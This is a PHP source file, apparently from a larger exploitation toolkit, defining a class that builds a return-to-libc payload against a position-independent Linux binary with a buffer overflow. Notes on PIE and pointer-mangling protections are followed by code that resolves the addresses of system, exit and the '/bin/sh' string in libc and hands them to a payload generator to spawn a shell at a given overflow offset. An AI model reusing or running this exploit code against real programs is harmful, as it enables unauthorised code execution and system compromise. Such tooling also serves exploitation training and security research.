<?php

/*
 Protections We Face: PIE
- Position Independent Executable
- Base address of executable (text/code) randomized by dynamic linker
- Treats executable like dynamic shared object for relocation ability (aslr now effective for binary map)
- Must be PIC (position independent code) compatible binary




Protections We Face: PTR_MANGLE
- XOR's (mangle()) pointers with random value
- Used mostly for vtable entries
	fops (file operations) IO_File structure as of 2011
	jmptable original purpose
- No longer replace pointer in table for further use
	demangle() with random value destroys original pointer

readelf -l server | grep -i RELRO


 */
class ret2pie4linux extends bin4linux{


	public function __construct($bin_bof) {
		parent::__construct($bin_bof);
		$name = __CLASS__;
		$rep_path = "$this->dir_tmp/$name";
		if (!file_exists($rep_path)) $this->create_folder($rep_path);
	}
	
	
	public function ret2pie4linux_system($offset_eip){
		
		$this->requette("nm -D -n $this->lib_linux_libc_32 | grep -E \"__libc_start_main|system\" ");
		$libc_start_main = $this->elf2addr4fonction_prog("__libc_start_main");
		$system = $this->elf2addr4fonction_prog("system");
		$exit = $this->elf2addr4fonction_prog("exit");
		
		$this->ssTitre("system-libc_start_main");
		$this->addr2sub4hex($system,$libc_start_main);
		
		
		$bin_sh = $this->elf2addr4bin_sh_only();
		
		$file_bin = new ret2lib4linux($this->file_path);
		
		$file_bin->payload_ret2lib4linux_system_exit_cmd_string($system, $exit, $bin_sh, $offset_eip);
	}
	
	
}	
?>